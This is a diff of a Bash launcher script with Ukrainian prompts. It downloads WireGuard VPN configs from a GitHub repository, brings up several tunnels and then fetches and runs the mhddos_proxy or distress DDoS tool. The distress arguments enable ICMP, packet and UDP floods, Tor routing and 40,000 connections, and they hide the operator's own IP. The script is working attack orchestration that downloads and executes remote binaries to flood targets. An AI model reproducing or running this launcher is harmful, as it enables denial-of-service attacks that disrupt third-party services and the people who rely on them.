@@ -1,26 +1,7 @@
 #!/bin/bash
 set -e
 
-# === Кольори ===
-print_header() {
-    echo -e "\e[1;36m========================================"
-    echo -e "🚀  Kaljan747 — Повний запуск"
-    echo -e "========================================\e[0m"
-}
-
-print_stage() {
-    echo -e "\e[1;34m$1\e[0m"
-}
-
-print_summary() {
-    echo -e "\n\e[1;33m----------------------------------------"
-    echo -e "📦  Залежності: \e[1;32mOK\e[0m"
-    echo -e "🌍  WG-тунелі: \e[1;32mOK\e[0m"
-    echo -e "⚙️  Модуль: $1 | PID: $2"
-    echo -e "----------------------------------------\e[0m"
-}
-
-WG_REPO_HTML="https://github.com/k7771/Kaljan747/tree/k7771/wg"
+WG_REPO_RAW="https://raw.githubusercontent.com/k7771/Kaljan747/k7771/wg"
 WG_DIR="$HOME/wg_confs"
 LOG_DIR="$HOME/logs"
 MODULE_DIR="$HOME/modules"
@@ -30,28 +11,19 @@ touch "$LOG_FILE"
 SUDO=$(command -v sudo || echo "")
 
 ask_user_id() {
-    read -p "Введіть ваш USER-ID (тільки цифри): " USER_ID
-    [[ "$USER_ID" =~ ^[0-9]+$ ]] || { echo "❌ USER-ID недійсний"; exit 1; }
+    read -p "USER-ID (тільки цифри): " USER_ID
+    [[ "$USER_ID" =~ ^[0-9]+$ ]] || { echo "USER-ID недійсний"; exit 1; }
 }
 
 ask_parameters() {
-    echo "Виберіть модуль:"
-    echo "1) mhddos_proxy"
-    echo "2) distress"
+    echo "1) mhddos_proxy | 2) distress"
     read -p "Ваш вибір (1/2): " mod_choice
     MODULE=$( [ "$mod_choice" = "1" ] && echo "mhddos_proxy" || echo "distress" )
-
-    echo "Редагувати INI перед запуском?"
-    echo "1) Так"
-    echo "2) Ні"
-    read -p "Ваш вибір (1/2): " edit_choice
+    echo "1) Так | 2) Ні"
+    read -p "Редагувати INI? (1/2): " edit_choice
     EDIT_INI=$( [ "$edit_choice" = "1" ] && echo "Так" || echo "Ні" )
-
-    echo "Режим запуску:"
-    echo "1) screen у фоні"
-    echo "2) screen відкрито"
-    echo "3) без screen"
-    read -p "Ваш вибір (1/2/3): " run_choice
+    echo "1) screen у фоні | 2) screen відкрито | 3) без screen"
+    read -p "Режим запуску (1/2/3): " run_choice
     case "$run_choice" in
         1) RUN_MODE="screen у фоні";;
         2) RUN_MODE="screen відкрито";;
@@ -59,64 +31,55 @@ ask_parameters() {
     esac
 }
 
-print_header
-
-print_stage "🌍 Завантаження WG-конфігів з GitHub"
-echo "[*] Завантаження нових конфігів без видалення старих..."
-ALL_CONF_URLS=$(curl -s "$WG_REPO_HTML" | grep -oP 'href="\K/k7771/Kaljan747/blob/k7771/wg/[^"?]*\.conf' | sed 's|^|https://raw.githubusercontent.com|;s|/blob|/|')
-for url in $ALL_CONF_URLS; do
-  filename=$(basename "$url")
-  dest="$WG_DIR/$filename"
-  if [ -f "$dest" ]; then
-    echo "[=] Пропущено (вже є): $filename"
-  else
-    curl -fsSL "$url" -o "$dest" && echo "[+] Завантажено: $filename" || echo "[-] Помилка: $filename"
-    chmod 600 "$dest"
-  fi
+echo "[+] Завантаження конфігів з GitHub..."
+for i in $(seq 1 30); do
+  FILE="wg$i.conf"
+  URL="$WG_REPO_RAW/$FILE"
+  DEST="$WG_DIR/$FILE"
+  [ -f "$DEST" ] && echo "[=] Вже є: $FILE" && continue
+  curl -fsSL "$URL" -o "$DEST" && echo "[+] $FILE" || echo "[-] $FILE"
+  chmod 600 "$DEST"
 done
 
-print_stage "🔻 Зупинка активних WG"
+echo "[+] Зупинка активних WG..."
 for iface in $(wg show interfaces 2>/dev/null); do
-  echo "[-] Зупиняю: $iface" | tee -a "$LOG_FILE"
+  echo "[-] $iface" | tee -a "$LOG_FILE"
   $SUDO wg-quick down "$iface" 2>/dev/null || true
   $SUDO ip link delete "$iface" 2>/dev/null || true
 done
 
-check_wg_connection() {
+check_wg() {
   curl -s --interface "$1" --max-time 5 https://api.ipify.org >/dev/null
 }
 
-WG_FILES=( $(find "$WG_DIR" -type f -name "*.conf" | shuf) )
+WG_FILES=( $(find "$WG_DIR" -name "*.conf" | shuf) )
 WG_IFACES=()
 INDEX=0
 
-print_stage "📡 Підключення WG..."
 while [ "${#WG_IFACES[@]}" -lt 4 ] && [ "$INDEX" -lt "${#WG_FILES[@]}" ]; do
-  conf="${WG_FILES[$INDEX]}"
-  IFACE_NAME=$(basename "$conf" .conf)
-  $SUDO wg-quick up "$conf" 2>/dev/null || true
+  CONF="${WG_FILES[$INDEX]}"
+  IFACE=$(basename "$CONF" .conf)
+  $SUDO wg-quick up "$CONF" 2>/dev/null || true
   sleep 2
-  if check_wg_connection "$IFACE_NAME"; then
-    echo "✅ $IFACE_NAME" | tee -a "$LOG_FILE"
-    WG_IFACES+=("$IFACE_NAME")
+  if check_wg "$IFACE"; then
+    echo "[+] $IFACE активний" | tee -a "$LOG_FILE"
+    WG_IFACES+=("$IFACE")
   else
-    echo "❌ $IFACE_NAME" | tee -a "$LOG_FILE"
-    $SUDO wg-quick down "$IFACE_NAME" 2>/dev/null || true
-    $SUDO ip link delete "$IFACE_NAME" 2>/dev/null || true
+    echo "[-] $IFACE не працює" | tee -a "$LOG_FILE"
+    $SUDO wg-quick down "$IFACE" 2>/dev/null || true
+    $SUDO ip link delete "$IFACE" 2>/dev/null || true
   fi
   INDEX=$((INDEX+1))
 done
 
-[ "${#WG_IFACES[@]}" -eq 0 ] && { echo "❌ Жоден тунель не працює"; exit 1; }
+[ "${#WG_IFACES[@]}" -eq 0 ] && echo "❌ Жоден WG не працює." && exit 1
 
 VPN_LIST=$(IFS=' '; echo "${WG_IFACES[*]}")
-VPN_LIST_COMMAS=$(IFS=','; echo "${WG_IFACES[*]}")
-echo "[✓] Активні інтерфейси: $VPN_LIST"
+VPN_COMMAS=$(IFS=','; echo "${WG_IFACES[*]}")
 
 ask_user_id
 ask_parameters
 
-print_stage "⬇️ Завантаження модуля $MODULE"
 if [ "$MODULE" = "mhddos_proxy" ]; then
   MODULE_BIN="$MODULE_DIR/mhddos_proxy"
   CONFIG_FILE="$MODULE_DIR/mhddos.ini"
@@ -126,7 +89,7 @@ else
   MODULE_BIN="$MODULE_DIR/distress"
   CONFIG_FILE="$MODULE_DIR/distress.ini"
   LINK="https://github.com/Yneth/distress-releases/releases/latest/download/distress_x86_64-unknown-linux-musl"
-  echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 --disable-auto-update -c 40000 --interface=$VPN_LIST_COMMAS --user-id=$USER_ID" > "$CONFIG_FILE"
+  echo "--use-my-ip 0 --enable-icmp-flood --enable-packet-flood --direct-udp-mixed-flood --use-tor 30 -c 40000 --disable-auto-update --interface=$VPN_COMMAS --user-id=$USER_ID" > "$CONFIG_FILE"
 fi
 
 [ -f "$MODULE_BIN" ] || curl -fsSL "$LINK" -o "$MODULE_BIN"
@@ -134,7 +97,6 @@ chmod +x "$MODULE_BIN"
 
 [ "$EDIT_INI" = "Так" ] && nano "$CONFIG_FILE"
 
-print_stage "🚀 Запуск модуля..."
 ARGS=$(cat "$CONFIG_FILE")
 if [ "$RUN_MODE" = "screen у фоні" ]; then
   screen -dmS "$MODULE" bash -c "$MODULE_BIN $ARGS"
@@ -145,4 +107,4 @@ else
 fi
 
 PID=$(pgrep -f "$MODULE_BIN")
-print_summary "$MODULE" "$PID"
+echo "[✓] Запущено $MODULE (PID $PID)"
